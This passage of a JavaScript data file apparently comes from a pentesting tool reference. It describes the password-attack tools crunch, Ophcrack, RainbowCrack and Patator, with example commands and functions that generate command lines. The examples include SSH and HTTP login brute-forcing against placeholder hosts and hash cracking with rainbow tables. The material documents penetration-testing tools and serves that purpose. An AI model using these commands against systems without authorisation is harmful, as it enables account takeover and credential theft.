    description: 'Pattern-based wordlist generator that creates every possible combination from given character sets and length ranges. Can generate lists of billions of entries piped directly into cracking tools. Use the pattern mode (-t) for structured passwords like "Company@@2024".',
    category: 'password-attacks',
    difficulty: 'beginner',
    tags: ['wordlist', 'generator', 'brute-force', 'permutations'],
    commands: [
      { command: 'crunch 6 8 > wordlist.txt', description: 'Generate all words from 6 to 8 chars using lowercase alphabet' },
      { command: 'crunch 4 4 0123456789 -o pins.txt', description: 'Generate all 4 digit PINs' },
      { command: 'crunch 8 8 -t pass@@@@ -o pass.txt', description: 'Use patterns: "pass" followed by 4 random lowercase letters' },
      { command: 'crunch 10 10 -t @@@^%%%% -o mixed.txt', description: 'Pattern with lower, upper, symbols, and numbers' },
    ],
    whenToUse: [
      'When you know the target password policy (e.g., must be 8 chars, 1 number, 1 symbol)',
      'To generate exhaustive PINs or predictable structured sequences',
      'As a real-time wordlist piped directly into Hashcat or John to save disk space',
    ],
    commonFlags: [
      { flag: 'min max', description: 'Minimum and maximum password length (positional arguments)' },
      { flag: '-o', description: 'Output file path' },
      { flag: '-t', description: 'Pattern template: @ = lowercase, , = uppercase, % = numbers, ^ = symbols' },
      { flag: '-b', description: 'Maximum file size before splitting (e.g., 10mb)' },
      { flag: '-p', description: 'Generate permutations of given words instead of combinations' },
    ],
    relatedTools: ['cewl', 'cupp', 'maskprocessor'],
    installation: 'sudo apt install crunch -y   # Pre-installed on Kali',
    website: 'https://sourceforge.net/projects/crunch-wordlist/',
    interactiveCommands: [
      {
        name: 'Crunch Dictionary Generator',
        description: 'Create exhaustive password dictionaries using length boundaries, character sets, and precise patterns.',
        inputs: [
          { id: 'minLength', label: 'Min Length', type: 'text', defaultValue: '6', placeholder: 'e.g., 6' },
          { id: 'maxLength', label: 'Max Length', type: 'text', defaultValue: '8', placeholder: 'e.g., 8' },
          { id: 'charset', label: 'Character Set', type: 'text', defaultValue: '', placeholder: 'e.g., 0123456789 or abc (Leave empty for default)' },
          { id: 'usePattern', label: 'Use Pattern (-t)', type: 'checkbox', defaultValue: 'false', placeholder: 'Enable pattern matching' },
          { id: 'pattern', label: 'Pattern String', type: 'text', defaultValue: 'pass@@@@', placeholder: '@=lower, ,=upper, %=num, ^=sym' },
          { id: 'splitSize', label: 'Split File Size (-b)', type: 'text', defaultValue: '', placeholder: 'e.g., 20mb (creates multiple files)' },
          { id: 'output', label: 'Output File (-o)', type: 'text', defaultValue: 'wordlist.txt', placeholder: 'Filename to save to' }
        ],
        generator: (inputs) => {
          let cmd = `crunch ${inputs.minLength} ${inputs.maxLength}`;
          
          if (inputs.charset) cmd += ` ${inputs.charset}`;
          if (inputs.usePattern === 'true' && inputs.pattern) cmd += ` -t ${inputs.pattern}`;
          if (inputs.splitSize) cmd += ` -b ${inputs.splitSize}`;
          if (inputs.output) cmd += ` -o ${inputs.output}`;
          
          return cmd;
        }
      }
    ]
  },
  {
    id: 'ophcrack',
    name: 'Ophcrack',
    description: 'A Windows password cracker based on time-memory trade-off using rainbow tables.',
    category: 'password-attacks',
    difficulty: 'intermediate',
    tags: ['windows', 'rainbow-tables', 'passwords', 'gui'],
    commands: [
      { command: 'ophcrack', description: 'Launch the GUI application' },
    ],
    whenToUse: [
      'To crack LM and NTLM Windows hashes instantly if they exist in pre-computed tables',
      'For demonstrating classic time-memory trade-off attacks visually',
      'When GPU resources for Hashcat are entirely unavailable but you have massive storage',
    ],
    relatedTools: ['rainbowcrack', 'john', 'hashcat'],
    website: 'https://ophcrack.sourceforge.io/',
  },
  {
    id: 'rainbowcrack',
    name: 'RainbowCrack',
    description: 'A general-purpose tool that generates and uses rainbow tables to crack password hashes.',
    category: 'password-attacks',
    difficulty: 'intermediate',
    tags: ['rainbow-tables', 'hashes', 'time-memory'],
    commands: [
      { command: 'rtgen md5 loweralpha 1 7 0 1000 1000 0', description: 'Generate a rainbow table' },
      { command: 'rtsort .', description: 'Sort generated tables for cracking' },
      { command: 'rcrack . -h 5d41402abc4b2a76b9719d911017c592', description: 'Crack a hash using the sorted tables' },
    ],
    whenToUse: [
      'For generating custom localized rainbow tables for specific hashes or salts',
      'To crack huge batches of predictable unsalted hashes instantly',
    ],
    relatedTools: ['ophcrack', 'hashcat'],
    website: 'http://project-rainbowcrack.com/',
    interactiveCommands: [
      {
        name: 'RainbowCrack Table Configurator',
        description: 'Build commands to generate, sort, and crack hashes using time-memory trade-off rainbow tables.',
        inputs: [
          { id: 'action', label: 'Action', type: 'select', options: ['Generate (rtgen)', 'Sort (rtsort)', 'Crack (rcrack)'], defaultValue: 'Crack (rcrack)' },
          { id: 'hashAlgorithm', label: 'Hash Algorithm', type: 'select', options: ['md5', 'sha1', 'ntlm', 'lm'], defaultValue: 'md5', helpText: 'Only used for generation' },
          { id: 'charset', label: 'Charset', type: 'select', options: ['loweralpha', 'loweralpha-numeric', 'numeric', 'mixalpha-numeric'], defaultValue: 'loweralpha', helpText: 'Only used for generation' },
          { id: 'lenMin', label: 'Min Length', type: 'text', defaultValue: '1', placeholder: 'Min password length' },
          { id: 'lenMax', label: 'Max Length', type: 'text', defaultValue: '7', placeholder: 'Max password length' },
          { id: 'targetHash', label: 'Target Hash (-h)', type: 'text', defaultValue: '5d41402abc4b2a76b9719d911017c592', placeholder: 'Hash to crack' },
          { id: 'tableDir', label: 'Table Directory', type: 'text', defaultValue: '.', placeholder: 'Path to .rt files' }
        ],
        generator: (inputs) => {
          if (inputs.action === 'Generate (rtgen)') {
             return `rtgen ${inputs.hashAlgorithm} ${inputs.charset} ${inputs.lenMin} ${inputs.lenMax} 0 1000 1000 0`;
          } else if (inputs.action === 'Sort (rtsort)') {
             return `rtsort ${inputs.tableDir}`;
          } else {
             return `rcrack ${inputs.tableDir} -h ${inputs.targetHash}`;
          }
        }
      }
    ]
  },
  {
    id: 'patator',
    name: 'Patator',
    description: 'Highly flexible, modular brute-forcer written in Python. Uses FILE descriptor variables for extreme customization — can brute-force any service by defining precise success/failure conditions with regex patterns. Ideal when Hydra/Medusa produce false positives.',
    category: 'password-attacks',
    difficulty: 'advanced',
    tags: ['brute-force', 'modular', 'python', 'flexible'],
    commands: [
      { command: 'patator ssh_login host=192.168.1.100 user=admin password=FILE0 0=passwords.txt', description: 'Brute force SSH using FILE descriptor variables' },
      { command: 'patator http_fuzz url=http://example.com/login method=POST body="user=admin&pass=FILE0" 0=passwords.txt', description: 'HTTP POST brute forcing' },
      { command: 'patator unzip_pass zip=archive.zip password=FILE0 0=passwords.txt', description: 'Crack a zip file locally' },
    ],
    whenToUse: [
      'When Hydra or Medusa lacks the specific edge-case flexibility you need',
      'To avoid false positives by defining extremely specific validation regex patterns natively in Python',
      'For unified multi-purpose brute forcing across entirely disparate services',
    ],
    commonFlags: [
      { flag: 'host=', description: 'Target hostname or IP' },
      { flag: 'user=', description: 'Username (or FILE0 for wordlist)' },
      { flag: 'password=', description: 'Password (or FILE0 for wordlist)' },
      { flag: '0=', description: 'Path to wordlist file for FILE0 placeholder' },
      { flag: '-x ignore:code=401', description: 'Ignore specific response codes (filter false positives)' },
    ],
    relatedTools: ['hydra', 'medusa', 'ncrack'],
    installation: 'sudo apt install patator -y',
    website: 'https://github.com/lanjelot/patator',
    interactiveCommands: [
      {
        name: 'Patator Modular Brute-Forcer',
        description: 'Design highly customized brute-force pipelines targeting web services, archives, and infrastructure using dynamic variable binding.',
        inputs: [
          { id: 'module', label: 'Target Module', type: 'select', options: ['ssh_login', 'ftp_login', 'http_fuzz', 'smb_login', 'unzip_pass'], defaultValue: 'ssh_login' },
          { id: 'target', label: 'Host / URL / File', type: 'text', defaultValue: '192.168.1.100', placeholder: 'IP, URL, or archive path' },
          { id: 'userMode', label: 'User Source', type: 'select', options: ['Static (e.g., admin)', 'Wordlist (FILE0)'], defaultValue: 'Static (e.g., admin)' },
          { id: 'username', label: 'Static Username', type: 'text', defaultValue: 'admin', placeholder: 'Only if Static' },
          { id: 'passMode', label: 'Password Source', type: 'select', options: ['Static (e.g., pass)', 'Wordlist (FILE0)'], defaultValue: 'Wordlist (FILE0)' },
          { id: 'staticPass', label: 'Static Password', type: 'text', defaultValue: 'password123', placeholder: 'Only if Static' },
          { id: 'wordlist', label: 'Wordlist Path (0=)', type: 'text', defaultValue: 'passwords.txt', placeholder: 'Path to dictionary' },
          { id: 'ignoreCode', label: 'Ignore HTTP Code', type: 'text', defaultValue: '401', placeholder: 'e.g., 401, 403 (for http_fuzz)' }
        ],
        generator: (inputs) => {
          let cmd = `patator ${inputs.module}`;
          
          if (inputs.module === 'http_fuzz') {
             cmd += ` url=${inputs.target} method=GET`;
             if (inputs.ignoreCode) cmd += ` -x ignore:code=${inputs.ignoreCode}`;
          } else if (inputs.module === 'unzip_pass') {
             cmd += ` zip=${inputs.target}`;
          } else {
             cmd += ` host=${inputs.target}`;
          }
          
          if (inputs.module !== 'unzip_pass') {
             if (inputs.userMode === 'Wordlist (FILE0)') cmd += ` user=FILE0`;
             else if (inputs.username) cmd += ` user=${inputs.username}`;
          }
          
          if (inputs.passMode === 'Wordlist (FILE0)') cmd += ` password=FILE0`;
          else if (inputs.staticPass) cmd += ` password=${inputs.staticPass}`;
          
          if (inputs.userMode === 'Wordlist (FILE0)' || inputs.passMode === 'Wordlist (FILE0)') {
             cmd += ` 0=${inputs.wordlist}`;
          }
          
          return cmd;
        }
      }
    ]
  }
];
